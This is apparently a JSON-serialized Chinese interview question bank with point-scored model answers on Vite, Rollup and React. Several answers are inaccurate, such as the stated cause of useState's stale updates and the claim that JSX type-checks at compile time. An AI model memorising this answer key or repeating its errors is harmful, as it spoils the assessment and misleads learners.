分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n\\n- **1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n\\n- **1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n\\n","task":false,"loose":true,"text":"**1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n","tokens":[{"type":"text","raw":"**1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n","text":"**1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。","text":" esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n\\n","task":false,"loose":true,"text":"**1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n","tokens":[{"type":"text","raw":"**1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n","text":"**1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。","text":" Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","task":false,"loose":true,"text":"**1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","tokens":[{"type":"text","raw":"**1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","text":"**1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","text":" 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","escaped":false}]}]}]}]},{"key":"Rollup","content":"<h1>Rollup</h1>\\n<h2>什么是 Rollup？它与 Webpack 有何不同？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>6：</strong> Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。</p>\\n</li>\\n<li><p>模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。</p>\\n</li>\\n<li><p>性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。</p>\\n</li>\\n<li><p>输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。</p>\\n</li>\\n<li><p>插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。</p>\\n</li>\\n<li><p>在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化</p>\\n</li>\\n<li><p>Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Rollup\\n\\n","depth":1,"text":"Rollup","tokens":[{"type":"text","raw":"Rollup","text":"Rollup","escaped":false}]},{"type":"heading","raw":"## 什么是 Rollup？它与 Webpack 有何不同？\\n\\n","depth":2,"text":"什么是 Rollup？它与 Webpack 有何不同？","tokens":[{"type":"text","raw":"什么是 Rollup？它与 Webpack 有何不同？","text":"什么是 Rollup？它与 Webpack 有何不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n\\n- 模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。\\n- 性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。\\n- 输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。\\n- 插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。\\n- 在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化\\n- Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n\\n","task":false,"loose":true,"text":"**6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n","tokens":[{"type":"text","raw":"**6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n","text":"**6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。","tokens":[{"type":"strong","raw":"**6：**","text":"6：","tokens":[{"type":"text","raw":"6：","text":"6：","escaped":false}]},{"type":"text","raw":" Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。","text":" Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。","escaped":false}]}]},{"type":"list_item","raw":"- 模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。\\n","task":false,"loose":true,"text":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","tokens":[{"type":"text","raw":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","text":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","tokens":[{"type":"text","raw":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","text":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","escaped":false}]}]},{"type":"list_item","raw":"- 性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。\\n","task":false,"loose":true,"text":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","tokens":[{"type":"text","raw":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","text":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","tokens":[{"type":"text","raw":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","text":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","escaped":false}]}]},{"type":"list_item","raw":"- 输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。\\n","task":false,"loose":true,"text":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","tokens":[{"type":"text","raw":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","text":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","tokens":[{"type":"text","raw":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","text":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","escaped":false}]}]},{"type":"list_item","raw":"- 插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。\\n","task":false,"loose":true,"text":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","tokens":[{"type":"text","raw":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","text":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","tokens":[{"type":"text","raw":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","text":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","escaped":false}]}]},{"type":"list_item","raw":"- 在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化\\n","task":false,"loose":true,"text":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","tokens":[{"type":"text","raw":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","text":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","tokens":[{"type":"text","raw":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","text":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","escaped":false}]}]},{"type":"list_item","raw":"- Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","task":false,"loose":true,"text":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","tokens":[{"type":"text","raw":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","text":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","tokens":[{"type":"text","raw":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","text":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","escaped":false}]}]}]}]},{"key":"react","content":"<h1>react</h1>\\n<h2>1. 什么是 React 的生命周期方法？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W1</h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 类组件声明周期方法:</li>\\n<li><strong>1：</strong> 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。</li>\\n<li><strong>1：</strong> 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。</li>\\n<li><strong>1：</strong> 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。</li>\\n<li><strong>1：</strong> 函数组件生命周期（Hooks）:</li>\\n<li><strong>1：</strong> useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nuseEffect(() =&gt; {\\n// 组件挂载时执行的操作\\nreturn () =&gt; {\\n// 组件卸载时清理资源\\n};\\n}, [dependencies]);  // 依赖数组\\n</code></pre>\\n<h2>2. React 中的 Hook 是什么？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W1</h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> useState()：用于在函数组件中添加状态。</li>\\n<li><strong>1：</strong> useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。</li>\\n<li><strong>1：</strong> useContext()：用于在函数组件中访问上下文（Context）。</li>\\n<li><strong>1：</strong> useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。</li>\\n<li><strong>1：</strong> useRef()：用于访问组件中的 DOM 节点或保存可变的值。</li>\\n<li><strong>1：</strong> useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。</li>\\n</ul>\\n<h2>3. React 中的状态和 props 有什么区别？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W2</h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。</li>\\n</ul>\\n<pre><code class=\\"language-js\\"> function MyComponent(props) {\\n  return &lt;h1&gt;{props.message}&lt;/h1&gt;;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function MyComponent() {\\n  const [count, setCount] = useState(0);\\n  return &lt;button onClick={() =&gt; setCount(count + 1)}&gt;{count}&lt;/button&gt;;\\n}\\n</code></pre>\\n<h2>4. React 中如何处理事件？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W2</h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function MyComponent() {\\n  const handleClick = (event) =&gt; {\\n    alert(&#39;Button clicked!&#39;);\\n  };\\n\\n  return &lt;button onClick={handleClick}&gt;Click Me&lt;/button&gt;;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> React 会自动绑定事件处理函数。</li>\\n<li><strong>1：</strong> 事件对象会被 React 规范化。</li>\\n</ul>\\n<h2>5. useState 连续调用，页面不更新？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<pre><code class=\\"language-js\\">const [age,  setAge] = useState(42);\\n\\nfunction handleClick() {\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n}\\n\\n// 点击一次后，age 将只会变为 43 而不是 45！\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。</li>\\n<li><strong>1：</strong> 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function handleClick() {\\n  setAge(a =&gt; a + 1); // setAge(42 =&gt; 43)\\n  setAge(a =&gt; a + 1); // setAge(43 =&gt; 44)\\n  setAge(a =&gt; a + 1); // setAge(44 =&gt; 45)\\n}\\n</code></pre>\\n<h2>6. React中的性能优化方法有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用React.memo进行组件缓存：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const MyComponent = React.memo(function MyComponent(props) {\\n  /* 组件逻辑 */\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用useMemo缓存计算结果：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用useCallback缓存函数：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const memoizedCallback = useCallback(\\n  () =&gt; {\\n    doSomething(a, b);\\n  },\\n  [a, b],\\n);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 合理使用key：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">{list.map(item =&gt; (\\n  &lt;ListItem \\n    key={item.id} // 使用唯一且稳定的key\\n    data={item}\\n  /&gt;\\n))}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 避免不必要的渲染：<ul>\\n<li>使用React.lazy进行代码分割</li>\\n<li>使用虚拟列表处理长列表</li>\\n<li>合理设计组件层级</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>7. 什么是 React？它的主要特点是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：</p>\\n</li>\\n<li><p>组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。</p>\\n</li>\\n<li><p>虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。</p>\\n</li>\\n<li><p>声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。</p>\\n</li>\\n<li><p>JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。</p>\\n</li>\\n<li><p>生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。</p>\\n</li>\\n</ul>\\n<h2>8. 什么是 JSX？它有什么优点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.</p>\\n</li>\\n<li><p>可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。</p>\\n</li>\\n<li><p>类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。</p>\\n</li>\\n<li><p>表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。</p>\\n</li>\\n<li><p>工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。</p>\\n</li>\\n</ul>\\n<h2>9. React中的Context是什么？如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Context的创建和提供：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const ThemeContext = React.createContext(&#39;light&#39;);\\n\\nfunction App() {\\n  return (\\n    &lt;ThemeContext.Provider value=&quot;dark&quot;&gt;\\n      &lt;ThemedButton /&gt;\\n    &lt;/ThemeContext.Provider&gt;\\n  );\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 在类组件中使用Context：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">class ThemedButton extends React.Component {\\n  static contextType = ThemeContext;\\n  render() {\\n    return &lt;Button theme={this.context} /&gt;;\\n  }\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 在函数组件中使用useContext：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">function ThemedButton() {\\n  const theme = useContext(ThemeContext);\\n  return &lt;Button theme={theme} /&gt;;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> Context的注意事项：<ul>\\n<li>避免过度使用Context</li>\\n<li>Context值变化会导致所有消费组件重新渲染</li>\\n<li>适合共享全局数据，如主题、用户信息等</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>10. 什么是虚拟 DOM？它是如何工作的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。</p>\\n</li>\\n<li><p>创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。</p>\\n</li>\\n<li><p>Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。</p>\\n</li>\\n<li><p>批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。</p>\\n</li>\\n</ul>\\n<h2>11. React 中的单向数据流是什么意思？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 